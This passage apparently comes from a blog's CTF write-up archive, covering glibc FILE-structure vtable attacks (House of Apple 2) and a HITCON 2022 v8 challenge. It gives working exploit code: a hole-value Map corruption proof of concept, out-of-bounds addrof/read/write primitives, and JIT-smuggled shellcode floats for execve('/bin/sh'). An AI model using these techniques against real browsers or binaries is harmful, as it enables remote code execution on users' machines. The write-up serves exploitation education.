} weak_alias (_IO_puts, puts) libc_hidden_def (_IO_puts) puts is an alias to _IO_puts. As you can see, the _IO_puts will call _IO_sputn (stdout, str, len), which based on this LOC in the glibc source code, is an alias to _IO_XSPUTN (__fp, __s, __n), which means it will jump to the stored pointer for __xsputn key in the stdout FILE. Inspecting via GDB (or you can deep dive its source code as well), stdout vtable mapped the key __xsputn to the _IO_new_file_xsputn method. gef➤ print _IO_2_1_stdout_ $4 = { file = { _flags = 0xfbad2887, _IO_read_ptr = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_read_end = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_read_base = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_write_base = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_write_ptr = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_write_end = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", ... _wide_data = 0x7ffff7fad9a0 \u003c_IO_wide_data_1\u003e, }, vtable = 0x7ffff7faa600 \u003c__GI__IO_file_jumps\u003e } gef➤ print __GI__IO_file_jumps $5 = { ... __overflow = 0x7ffff7e20e40 \u003c_IO_new_file_overflow\u003e, __underflow = 0x7ffff7e20b30 \u003c_IO_new_file_underflow\u003e, __uflow = 0x7ffff7e21de0 \u003c__GI__IO_default_uflow\u003e, __pbackfail = 0x7ffff7e23300 \u003c__GI__IO_default_pbackfail\u003e, __xsputn = 0x7ffff7e1f680 \u003c_IO_new_file_xsputn\u003e, ... __write = 0x7ffff7e1ef40 \u003c_IO_new_file_write\u003e, } So now, let’s check the code. size_t _IO_new_file_xsputn (FILE *f, const void *data, size_t n) { const char *s = (const char *) data; size_t to_do = n; int must_flush = 0; size_t count = 0; ... if (to_do + must_flush \u003e 0) { size_t block_size, do_write; /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) /* If nothing else has to be written we must not signal the caller that everything has been written. */ return to_do == 0 ? EOF : n - to_do; /* Try to maintain alignment: write a whole number of blocks. */ block_size = f-\u003e_IO_buf_end - f-\u003e_IO_buf_base; do_write = to_do - (block_size \u003e= 128 ? to_do % block_size : 0); if (do_write) { count = new_do_write (f, s, do_write); to_do -= count; if (count \u003c do_write) return n - to_do; } ... } libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn) If you read the code, it will call _IO_OVERFLOW(f, EOF) before calling new_do_write to write the actual string that we want to print. Based on the vtable above that we see in gdb (the _IO_file_jumps), calling _IO_OVERFLOW equivalents to jump to _IO_new_file_overflow. Let’s check the disassembly result ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:2","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Gaining Remote Code Execution (RCE) Up until now, we have: OOB write to libc area. Libc base address from the leak. We need to leverage the OOB bug and the libc base address leaked info to gain RCE. One thing that comes in mind is using the knowledge that I gathered from the recent discussion about gaining RIP control from FILE structure attack in Glibc 2.35. To give some context, in the old version of glibc, we can overwrite the file-\u003evtable address with our fake vtable, so that let’s say when a method wants to call _IO_OVERFLOW, instead of jumping to the correct address, it will jump to our desired address that we set in our fake vtable. However, this has been mitigated because the glibc will check whether the vtable that is stored in the FILE is in the correct region or not. Check the below LOCs: static inline const struct _IO_jump_t * IO_validate_vtable (const struct _IO_jump_t *vtable) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; uintptr_t ptr = (uintptr_t) vtable; uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables; if (__glibc_unlikely (offset \u003e= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable; } #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-\u003eFUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) #define _IO_JUMPS_FILE_plus(THIS) \\ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable) Taking example let’s say a method tries to call _IO_OVERRFLOW, it will try to do the jump to the stored pointer in the vtable value mapped with key __overflow, and before jumping into it, it will validate first whether the stored pointer is in the valid area or not by calling IO_validate_vtable. So that trick where we set up our fake vtable to jump to a method outside the vtable section area no longer works. However, because the check only validates whether the stored pointer is in vtable region or not, we can still misalign the table (For example, shift the vtable by one entry, so that when a function called _IO_OVERFLOW, it will jump to _IO_UNDERFLOW instead due to the misalignment). People try to find a way to abuse this check, and recently in this article by kylebot, he found that the glibc does the check only when jumping with macro _IO_JUMPS_FUNC, but it didn’t validate the check when it uses a macro to jump to the wide_vtable, which is _IO_WIDE_JUMPS_FUNC. Also turns out, there is another article that has been published a few months ago that tried to abuse the same finding from kylebot. The method is called House of Apple 2, which was posted by roderick01 in this article. I’ll try to explain it in more detail based on my understanding during reading these two blogs. Remember that the mitigation those were implemented in the recent glibc only checks whether the vtable stored in the FILE properties is still in the correct region or not. And the standard vtable that is being used for stdfile is _IO_file_jumps. But in fact, there is a lot of other vtable in the region that we can use, and one of them is _IO_wfile_jumps. Below is the default entry of the _IO_wfile_jumps printed via gdb: gef➤ print __GI__IO_wfile_jumps $11 = { __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7e20070 \u003c_IO_new_file_finish\u003e, __overflow = 0x7ffff7e1a410 \u003c__GI__IO_wfile_overflow\u003e, __underflow = 0x7ffff7e19050 \u003c__GI__IO_wfile_underflow\u003e, __uflow = 0x7ffff7e178c0 \u003c__GI__IO_wdefault_uflow\u003e, __pbackfail = 0x7ffff7e17680 \u003c__GI__IO_wdefault_pbackfail\u003e, __xsputn = 0x7ffff7e1a8c0 \u003c__GI__IO_wfile_xsputn\u003e, __xsgetn = 0x7ffff7e1f330 \u003c__GI__IO_file_xsgetn\u003e, __seekoff = 0x7ffff7e197d0 \u003c__GI__IO_wfile_seekoff\u003e, __seekpos = 0x7ffff7e22530 \u003c_IO_default_seekpos\u003e, __setbuf = 0x7ffff7e1e620 \u003c_IO_new_file_setbuf\u003e, __sync =","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:3","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":" HITCON CTF 2022 During the weekends, I spent my time working on the HITCON CTF challenge called “Fourchain - Hole”. This is my first time doing a v8 browser pwn challenge, so I would like to apologize in advance if there is any mistake in my explanations and feel free to correct me if I’m wrong. Fourchain - Hole There's a hole in the program ? Well I'm sure it's not that of a big deal, after all it's just a small hole that won't do any damage right ? ... Right 😨 ? Author: bruce30262 ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:0:0","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Initial Analysis This is a v8 browser challenge. We were given a zip consisting: The d8 binary. This is a v8 developer shell that can execute javascript code. add_hole.patch. This is the patch for the particular challenge. README.txt. This contains information about the args that the author specified during building the d8 binary, the commit hash that we should use to build it (which is 63cb7fb817e60e5633fb622baf18c59da7a0a682), and a hint that we should prepare our exploit in Debian Linux 11.5. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:0","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Prerequisite I highly recommend you read this great article to gain some fundamentals on how v8 works. But keep in mind that the article is already outdated because v8 has changed some of their objects’ internal representation after the publication of that article. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:1","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Environment Setup To start the challenge, we should prepare our environment first. Below is the summary of what I did to setup the environment (I followed the environment setup by Faraz’s article): # Install depot_tools and put it in the PATH git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git echo \"export PATH=\u003cyour_depot_tools_path\u003e:$PATH\" \u003e\u003e ~/.zshrc # Prepare the needed files to build fetch v8 cd v8 ./build/install-build-deps.sh git checkout \u003ccommit_hash\u003e gclient sync git apply add_hole.patch ./tools/dev/v8gen.py x64.release After executing the above script, there will be a file called args.gn inside the out.gn/x64.release folder. Add these lines to the file before building it to make our debugging life easier symbol_level = 2 v8_enable_object_print = true And then we will build it with the below command # Build it (It took me an hour to build it, so be patient) ninja -C ./out.gn/x64.release Additional Step: My pwndbg doesn’t recognize the job command, which is very useful to debug the v8 shell later. After spending some quite time, turn out the solution is I need to add this LOC to my .gdbinit file: source \u003cpath_to_your_v8_folder\u003e/tools/gdbinit After we successfully build the d8 binary, then we are ready to start the challenge. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:2","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Analyze the patch Let’s check the patch file. diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc index 6e0cd408e7..aafdfb8544 100644 --- a/src/builtins/builtins-array.cc +++ b/src/builtins/builtins-array.cc @@ -395,6 +395,12 @@ BUILTIN(ArrayPush) { return *isolate-\u003efactory()-\u003eNewNumberFromUint((new_length)); } +BUILTIN(ArrayHole){ + uint32_t len = args.length(); + if(len \u003e 1) return ReadOnlyRoots(isolate).undefined_value(); + return ReadOnlyRoots(isolate).the_hole_value(); +} + namespace { V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate, diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc index 78b0229011..55aaaa03df 100644 --- a/src/builtins/builtins-collections-gen.cc +++ b/src/builtins/builtins-collections-gen.cc @@ -1763,7 +1763,7 @@ TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) { \"Map.prototype.delete\"); // This check breaks a known exploitation technique. See crbug.com/1263462 - CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant())); + //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant())); const TNode\u003cOrderedHashMap\u003e table = LoadObjectField\u003cOrderedHashMap\u003e(CAST(receiver), JSMap::kTableOffset); diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h index 0e98586f7f..28a46f2856 100644 --- a/src/builtins/builtins-definitions.h +++ b/src/builtins/builtins-definitions.h @@ -413,6 +413,7 @@ namespace internal { TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel) \\ /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */ \\ TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel) \\ + CPP(ArrayHole) \\ \\ /* ArrayBuffer */ \\ /* ES #sec-arraybuffer-constructor */ \\ diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc index 79bdfbddcf..c42ad4c789 100644 --- a/src/compiler/typer.cc +++ b/src/compiler/typer.cc @@ -1722,6 +1722,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) { return Type::Receiver(); case Builtin::kArrayUnshift: return t-\u003ecache_-\u003ekPositiveSafeInteger; + case Builtin::kArrayHole: + return Type::Oddball(); // ArrayBuffer functions. case Builtin::kArrayBufferIsView: diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc index 9040e95202..a77333287a 100644 --- a/src/init/bootstrapper.cc +++ b/src/init/bootstrapper.cc @@ -1800,6 +1800,7 @@ void Genesis::InitializeGlobal(Handle\u003cJSGlobalObject\u003e global_object, Builtin::kArrayPrototypeFindIndex, 1, false); SimpleInstallFunction(isolate_, proto, \"lastIndexOf\", Builtin::kArrayPrototypeLastIndexOf, 1, false); + SimpleInstallFunction(isolate_, proto, \"hole\", Builtin::kArrayHole, 0, false); SimpleInstallFunction(isolate_, proto, \"pop\", Builtin::kArrayPrototypePop, 0, false); SimpleInstallFunction(isolate_, proto, \"push\", Builtin::kArrayPrototypePush, After reading the patch, some interesting information: It introduces a new function called hole in an array. If we read the BUILTIN(ArrayHole) definition, the hole function: Doesn’t need any args Will return a value from the_hole_value() It disables a CSA_CHECK, which job is to make sure that the assigned key isn’t hole, and also it has a link to crbug.com/1263462 which contains the exploitation related to the hole value. We will visit this site soon to gain some information on what is hole value. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:3","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Searching for the hole value I don’t have any idea what is hole and why it is dangerous. So, I decided to read through the article that was mentioned in the patch first. After reading through the crbug article, turns out hole is a constant defined in the v8 source code. Due to special handling of the hole value in the javascript Map datatype, if we got a leak of the hole value and set it as one of the Map object keys, we can corrupt the Map length to -1, because somehow, we can call Map.delete(hole) twice, which leads to decrement the Map size by two for one key only. Below is the simple POC stated in the article: var map = new Map(); map.set(1, 1); map.set(hole, 1); // Due to special handling of hole values, this ends up setting the size of the map to -1 map.delete(hole); map.delete(hole); map.delete(1); // Size is now -1 //print(map.size); Now that we know the bug introduced in the patch, we can move to the next step, which is trying to find a way to exploit this bug. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:4","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Exploitation Now, our first plan would be to recreate the simple POC created in the article locally and try to examine the memory layout after the corruption. But before that, we should gain some knowledge first on how Map is represented. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:0","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Understanding how Map works First, let’s prepare a js file called poc.js, which contains: var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); Let’s start the d8 via gdb. Don’t forget to add --allow-natives-syntax so that we can use commands like %DebugPrint inside the d8, and --shell so that after executing our script, the interpreter will be still running, and we can continue to debug it. ╰─❯ gdb d8 GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1 Copyright (C) 2022 Free Software Foundation, Inc. ... pwndbg\u003e run --allow-natives-syntax --shell ./poc.js Let’s try to examine the memory layout. First, try to inspect the m object via %DebugPrint: V8 version 11.0.0 (candidate) d8\u003e %DebugPrint(m) DebugPrint: 0x3ba20005380d: [JSMap] - map: 0x3ba2001862f1 \u003cMap[16](HOLEY_ELEMENTS)\u003e [FastProperties] - prototype: 0x3ba200186431 \u003cObject map = 0x3ba200186319\u003e - elements: 0x3ba200002259 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - table: 0x3ba20005381d \u003cOrderedHashMap[17]\u003e - properties: 0x3ba200002259 \u003cFixedArray[0]\u003e - All own properties (excluding elements): {} ... We can shift our focus towards the table properties which is an OrderedHashMap (I recommend you to read this article to gain a better understanding of how the OrderedHashMap works in v8). table is the one that stores the Map elements, current capacity, and buckets. Let’s try to examine the table memory (Remember that we need to subtract the object address returned by the %DebugPrint by 1 in GDB). pwndbg\u003e x/30wx 0x3ba20005381d-1 0x3ba20005381c: 0x00002c29 0x00000022 0x00000004 0x00000000 0x3ba20005382c: 0x00000004 0x00000002 0xfffffffe 0x00000002 0x3ba20005383c: 0x00000002 0xfffffffe 0x00002459 0x00000002 0x3ba20005384c: 0x00000000 0x000023e1 0x000023e1 0x000023e1 0x3ba20005385c: 0x000023e1 0x000023e1 0x000023e1 0x000021b9 0x3ba20005386c: 0x00000008 0x00000004 0x00000000 0x00197aa7 0x3ba20005387c: 0x000023e1 0x000023e1 0x000021b9 0x00000008 0x3ba20005388c: 0x00000008 0x00000000 We can use the job commands provided by the v8 developers so that we can deduce what the raw data represents. pwndbg\u003e job 0x3ba20005381d 0x3ba20005381d: [OrderedHashMap] - FixedArray length: 17 - elements: 2 - deleted: 0 - buckets: 2 - capacity: 4 - buckets: { 0: 1 1: -1 } - elements: { 0: 1 -\u003e 1 } pwndbg\u003e job 0x3ba200002459 0x3ba200002459: [Oddball] in ReadOnlySpace: #hole So, connecting the dots, the rough layout of some important metadata of the OrderedHashMap: table + 0x10 =\u003e Map capacity (0x4) table + 0x14 =\u003e Bucket-0 data table + 0x18 =\u003e Bucket-1 data table + 0x1c =\u003e Entry-0 key (0x00000002) table + 0x20 =\u003e Entry-0 value (0x00000002) table + 0x24 =\u003e Entry-0 next_ptr table + 0x28 =\u003e Entry-1 key (0x00002459) table + 0x2c =\u003e Entry-1 value (0x00000002) table + 0x30 =\u003e Entry-1 next_ptr Info Integer is represented as 31-bit in v8, which is why 0x1 is represented as 0x2. Another example, -1 is represented as 0xfffffffe in the raw memory data. Info v8 has pointer compression method (Read this article for a better understanding). tl;dr; v8 only store lower 32-bit of a pointer in the memory, and storing the base upper 32-bit in a specific register. And every time v8 want to use it, it will do calculation like ptr = base_upper + stored_lower. This is why when we set hole as the key, the stored value is only the lower 32-bit of the hole address, which is 0x2459. Note job is failed to print the map elements properly because of the second element’s key is hole. In normal condition, the job command will print all the map elements correctly. Reading through the previous article that I recommend you to read about the detailed implementation of OrderedHashMap in JS, some important key information about map: Capacity is required to be a power of 2 Number of buckets = Capacity / 2 ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:1","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"The corrupted map’s impact Now, it’s time for us to try to re-create the simple POC that the crbug article gave. I recommend you to read this article because it helps me a lot to exploit the corrupted map later. Let’s change our poc.js file contents to like below: var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); Let’s try to examine this in the gdb. d8\u003e m.size -1 The POC is working, now we have a map where its size = -1. What is the impact? Let’s just try to check the impact by trying to set a new pair of (key, value) to the corrupted map, hoping that we can somehow trigger Out-of-Bounds write. d8\u003e m.set(0x8, -1) ... # Back to gdb and examine the table properties memory. pwndbg\u003e x/40wx 0x2b4f0027fbfd-1 0x2b4f0027fbfc: 0x00002c29 0x00000022 0x00000000 0x00000000 0x2b4f0027fc0c: 0x00000010 0xfffffffe 0xfffffffe 0x000023e1 0x2b4f0027fc1c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x2b4f0027fc2c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x2b4f0027fc3c: 0x000023e1 0x000023e1 0x000023e1 0x000025d5 0x2b4f0027fc4c: 0x928a22d2 0x00000004 0x29386428 0x000025d5 0x2b4f0027fc5c: 0x71bade4e 0x00000006 0x69732e6d 0x0027657a 0x2b4f0027fc6c: 0x00002231 0x00000004 0xe3e5e7e0 0x0027fc49 0x2b4f0027fc7c: 0x00003039 0x00000004 0xb859fc74 0x0019a803 0x2b4f0027fc8c: 0x000022c9 0x000006e8 0x0cebf631 0x31d00148 Notice that table+0x10 value, which is the map’s capacity got overwritten with our set key (0x10 is the 0x8 integer representation in JS). Let’s verify this with the job command. pwndbg\u003e job 0x2b4f0027fbfd 0x2b4f0027fbfd: [OrderedHashMap] - FixedArray length: 17 - elements: 0 - deleted: 0 - buckets: 8 - capacity: 16 - buckets: { 0: -1 1: -1 2: 0x2b4f000023e1 \u003cundefined\u003e 3: 0x2b4f000023e1 \u003cundefined\u003e 4: 0x2b4f000023e1 \u003cundefined\u003e 5: 0x2b4f000023e1 \u003cundefined\u003e 6: 0x2b4f000023e1 \u003cundefined\u003e 7: 0x2b4f000023e1 \u003cundefined\u003e } - elements: { } Voila, we have successfully overwritten the map’s capacity, and because of that, the buckets got extended, and the elements’ location will be shifted as well. That means, by corrupting the map size to -1, due to the corrupted capacity value after the first map.set call (after the size is -1), when the map.set method got called for the second time, it will store the map entry (key, value, next_ptr) in the outside of the map (OOB write to the objects below the map object). Let’s try to prove it by modifying our poc.js file to: var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); Below is the oob_arr address retrieved from the %DebugPrint: d8\u003e %DebugPrint(m) DebugPrint: 0x1d9d0028756d: [JSMap] - map: 0x1d9d001862f1 \u003cMap[16](HOLEY_ELEMENTS)\u003e [FastProperties] - prototype: 0x1d9d00186431 \u003cObject map = 0x1d9d00186319\u003e - elements: 0x1d9d00002259 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - table: 0x1d9d0028764d \u003cOrderedHashMap[17]\u003e - properties: 0x1d9d00002259 \u003cFixedArray[0]\u003e - All own properties (excluding elements): {} ... d8\u003e %DebugPrint(oob_arr) DebugPrint: 0x1d9d00287699: [JSArray] - map: 0x1d9d0018e6bd \u003cMap[16](PACKED_DOUBLE_ELEMENTS)\u003e [FastProperties] - prototype: 0x1d9d0018e11d \u003cJSArray[0]\u003e - elements: 0x1d9d002876b1 \u003cFixedDoubleArray[2]\u003e [PACKED_DOUBLE_ELEMENTS] - length: 2 - properties: 0x1d9d00002259 \u003cFixedArray[0]\u003e - All own properties (excluding elements): { 0x1d9d00006551: [String] in ReadOnlySpace: #length: 0x1d9d00144255 \u003cAccessorInfo name= 0x1d9d00006551 \u003cString[6]: #length\u003e, data= 0x1d9d000023e1 \u003cundefined\u003e\u003e (const accessor descriptor), location: descriptor } - elements: 0x1d9d002876b1 \u003cFixedDoubleArray[2]\u003e { 0: 1.1 1: 2.2 } ... Let’s examine it in gdb: pwndbg\u003e x/30wx 0x1d9d0028764d-1 0x1d9d0028764c: 0x00002c29 0x00000022 0xfffffffe 0x00000000 0x1d9d0028765c: 0x00000004 0xfffffffe 0xfffffffe 0x000023e1 0x1d9d0028766c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x1d9d0028767c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x1d9d0028768c: 0x000023e1 0x000023e1 ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:2","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Preparing primitives Now that we have an array that can do OOB read and write, to control the RIP, we need to be able to perform: addrof: Get the address of an object. read : Read the value of the given address. write : Write a value to the given address. Creating helpers To make our life easier, we need to define some helpers to easily convert from floating point to hex and vice-versa (Notice that everytime we access oob_arr elements, the returned value is in form of floating-point). Helpers are taken from Faraz’s blog. var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u003c\u003c 32n); } function itof(val) { u64_buf[0] = Number(val \u0026 0xffffffffn); u64_buf[1] = Number(val \u003e\u003e 32n); return f64_buf[0]; } Creating addrof Let’s start by creating the easiest method, which is addrof. The trick is simple (inspired from this article): Create a new variable called victim, which is an array of empty objects. Assign the targeted object to one of the elements of the victim’s array. After this, now the assigned victim’s element will store a pointer to the address of the targeted object (lower 32-bit only). Using OOB read from the oob_arr, read the victim’s elements’ stored value (which is the targeted object address). Modify the poc.js to: ... // Helpers is put at the top of these LOCs var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); victim = [{}, {}, {}, {}]; function addrof(in_obj) { mask = (1n \u003c\u003c 32n) - 1n victim[0] = in_obj; return ftoi(oob_arr[12]) \u0026 mask; } Notes: Remember that v8 only store the lower 32-bit of the object address, while oob_arr value is a 64-bit floating point, so the addrof method will need to be masked so that it will return only the lower 32-bits. Sometimes, the correct offset for the oob_arr is changing during development. You need to examine it in the gdb properly so that oob_arr[chosen_offset] will return the targeted object address stored inside the victim[0] Creating Read After having addrof method, we need to be able to read the given address value. I decided to create a read method where: It can only read addresses relative to the stored js_base, so it can’t read the value outside the js heap. Send only the lower 32-bit of your targeted address (must be inside the js heap). It will return a 64-bit floating point value of the resolved address’s value. The trick that I used: Create an array called read_gadget which consists of floating-point values. With OOB write from the oob_arr, overwrite the read_gadget elements pointer so that it points to target_addr-0x8. Why -0x8, because the first element of the array is stored in elements+0x8, so by setting the elements to point to target_addr-0x8, accessing read_gadget[0] will point to the target_addr value. Return it Modify the poc.js to: ... // Helpers is put at the top of these LOCs var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); read_gadget = [1.1, 2.2, 3.3]; function addrof(in_obj) { mask = (1n \u003c\u003c 32n) - 1n victim[0] = in_obj; return ftoi(oob_arr[12]) \u0026 mask; } function weak_read(addr) { oob_arr[37] = itof(0x600000000n+addr-0x8n); return ftoi(read_gadget[0]); } Notes: The correct offset of oob_arr which points to the properties of read_gadget elements might be changed during the development of our exploit. Always double-check it in gdb Because oob_arr is overwriting the whole 64-bit of the given address, we need to overwrite the read_gadget length as well, which is why I add the targeted address with 0x600000000 as the 32 upper-bit value. Creating Write Now that we have read, it’s time to create the write. How to do it? Very simple. Same as weak_read method, but instead of returning the read_gadget[0] value, we assign the read_gadget[0] value wi","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:3","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Finding a way to control the RIP Now that we have all the primitives that we need, we will move to our last step, which is controlling the RIP. After reading some articles, I find this article very helpful for me. Reading through the article, we actually can smuggle shellcode via JIT Spraying attack. To smuggle it, what we can do is translate our shellcode to a floating-point number, so that our floating-point number hex is stored as it is in the Jitted function area. For example, consider this code (taken from the article that I mentioned above). const foo = ()=\u003e { return [1.0, 1.95538254221075331056310651818E-246, 1.95606125582421466942709801013E-246, 1.99957147195425773436923756715E-246, 1.95337673326740932133292175341E-246, 2.63486047652296056448306022844E-284]; } for (let i = 0; i \u003c 0x10000; i++) {foo();foo();foo();foo();} The floating-point defined in the javascript is actually the smuggled shellcode which will do sys_execve('/bin/sh'). Because the function is called so many times, v8 will JIT the code. Let’s try to examine what happen when the method foo got jitted by v8 with the help of %DebugPrint and job after executing the above code. d8\u003e %DebugPrint(foo) DebugPrint: 0x1d9d002ca78d: [Function] in OldSpace - map: 0x1d9d00184241 \u003cMap[28](HOLEY_ELEMENTS)\u003e [FastProperties] - prototype: 0x1d9d001840f5 \u003cJSFunction (sfi = 0x1d9d00145dfd)\u003e - elements: 0x1d9d00002259 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - function prototype: \u003cno-prototype-slot\u003e - shared_info: 0x1d9d0019a025 \u003cSharedFunctionInfo foo\u003e - name: 0x1d9d00199ea5 \u003cString[3]: #foo\u003e - formal_parameter_count: 0 - kind: ArrowFunction - context: 0x1d9d0019a2a1 \u003cScriptContext[3]\u003e - code: 0x1d9d0019a79d \u003cCodeDataContainer TURBOFAN\u003e ... # Back to GDB pwndbg\u003e x/20wx 0x1d9d002ca78d-1 0x1d9d002ca78c: 0x00184241 0x00002259 0x00002259 0x0019a025 0x1d9d002ca79c: 0x0019a2a1 0x0019a271 0x0019a79d 0x000025d5 0x1d9d002ca7ac: 0x00000003 0x00000006 0x626f6c67 0x00006c61 0x1d9d002ca7bc: 0x000025d5 0x00000003 0x00000006 0x6b726f57 0x1d9d002ca7cc: 0x00007265 0x000025d5 0x00000003 0x00000005 Notice that there is a property called code inside the foo method, where based on examination in gdb, the offset is code = foo+0x18. Let’s examine the code property in gdb. pwndbg\u003e x/20wx 0x1d9d0019a79d-1 0x1d9d0019a79c: 0x00002a71 0x000023e1 0xc0004781 0xc00047c0 0x1d9d0019a7ac: 0x00005554 0xffff001d 0x00000004 0x000079f9 0x1d9d0019a7bc: 0x000023e1 0x00000000 0x00000000 0x00000002 0x1d9d0019a7cc: 0x00000002 0x000023e1 0x000079f9 0x000023e1 0x1d9d0019a7dc: 0x002875c9 0x000023e1 0x00000002 0x00000002 pwndbg\u003e job 0x1d9d0019a79d 0x1d9d0019a79d: [CodeDataContainer] in OldSpace - map: 0x1d9d00002a71 \u003cMap[28](CODE_DATA_CONTAINER_TYPE)\u003e - kind: TURBOFAN - is_off_heap_trampoline: 0 - code: 0x5554c0004781 \u003cCode TURBOFAN\u003e - code_entry_point: 0x5554c00047c0 - kind_specific_flags: 4 pwndbg\u003e job 0x5554c0004781 0x5554c0004781: [Code] - map: 0x1d9d0000264d \u003cMap(CODE_TYPE)\u003e - code_data_container: 0x1d9d0019a79d \u003cCodeDataContainer TURBOFAN\u003e kind = TURBOFAN stack_slots = 6 compiler = turbofan address = 0x5554c0004781 Instructions (size = 360) 0x5554c00047c0 0 8b59d0 movl rbx,[rcx-0x30] 0x5554c00047c3 3 4903de REX.W addq rbx,r14 ... 0x5554c0004831 71 49ba682f73680058eb0c REX.W movq r10,0xceb580068732f68 0x5554c000483b 7b c4c1f96ec2 vmovq 